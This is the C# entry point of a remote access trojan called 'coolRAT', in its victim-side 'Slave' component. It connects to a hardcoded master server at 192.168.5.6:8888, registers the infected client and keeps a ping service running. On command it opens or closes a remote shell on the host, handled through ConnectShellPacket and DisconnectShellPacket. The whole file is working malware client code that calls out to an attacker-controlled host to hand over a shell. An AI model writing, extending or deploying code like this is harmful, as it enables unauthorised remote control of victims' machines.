using coolRAT.Libs;
using coolRAT.Libs.Connections;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace coolRAT.Slave
{
    class Program
    {
        static void Main(string[] args)
        {
            CAP_Client authClient = new CAP_Client(new IPEndPoint(IPAddress.Parse("192.168.5.6"), 8888));
            Console.WriteLine("Client Authorization Protocol client initialized");
            Console.WriteLine("Registering client...");
            Globals.LocalClient = authClient.CreateClient(authClient.RegisterClient());
            Console.WriteLine("Connected!");
            Globals.LocalClient.RegisterPacketHandler("ConnectShellPacket", Shell_PacketReceivedHandler);
            Globals.LocalClient.ClientPingService.Start(PingServiceType.Active);
            Globals.LocalClient.ClientPingService.ConnectionLost += ClientPingService_ConnectionLost;
            Application.Run();
            return;
        }

        private static void ClientPingService_ConnectionLost(object sender, ConnectionLostEventArgs e)
        {
            Console.WriteLine("Lost connection to the master server!");
            if(Globals.ShellInstance != null)
                Globals.ShellInstance.Stop();
            if(Globals.LocalClient != null)
            {
                Globals.LocalClient.Connection.StopAll();
                Globals.LocalClient.ClientPingService.Stop();
                Globals.LocalClient = null;
            }
        }

        public static void Shell_PacketReceivedHandler(object sender, PacketReceivedEventArgs e)
        {
            if(e.Packet.Type == "ConnectShellPacket")
            {
                if (Globals.ShellInstance != null)
                {
                    Globals.ShellInstance.Stop();
                    Globals.ShellInstance = null;
                }

                Globals.ShellInstance = new Shell(Globals.LocalClient);
                ShellConnectedPacket result_success = new ShellConnectedPacket(Globals.LocalClient.UniqueId, Globals.ShellInstance.UniqueId, true);
                Globals.LocalClient.SendPacket(result_success);

                return;
            }
            if(e.Packet.Type == "DisconnectShellPacket")
            {
                DisconnectShellPacket packet = DisconnectShellPacket.Deserialize(e.RawPacket);
                if (Globals.ShellInstance == null)
                {
                    ShellDisconnectedPacket shellDisconnectedPacket = new ShellDisconnectedPacket(Globals.LocalClient.UniqueId, packet.ShellUniqueId, false);
                    Globals.LocalClient.SendPacket(shellDisconnectedPacket);
                    return;
                }

                if(Globals.ShellInstance.UniqueId != packet.ShellUniqueId)
                {
                    ShellDisconnectedPacket shellDisconnectedPacket = new ShellDisconnectedPacket(Globals.LocalClient.UniqueId, packet.ShellUniqueId, false);
                    Globals.LocalClient.SendPacket(shellDisconnectedPacket);
                    return;
                }

                Globals.ShellInstance.Stop();
                Globals.ShellInstance = null;
                ShellDisconnectedPacket success = new ShellDisconnectedPacket(Globals.LocalClient.UniqueId, packet.ShellUniqueId, true);
                Globals.LocalClient.SendPacket(success);
                return;
            }
        }
    }
}
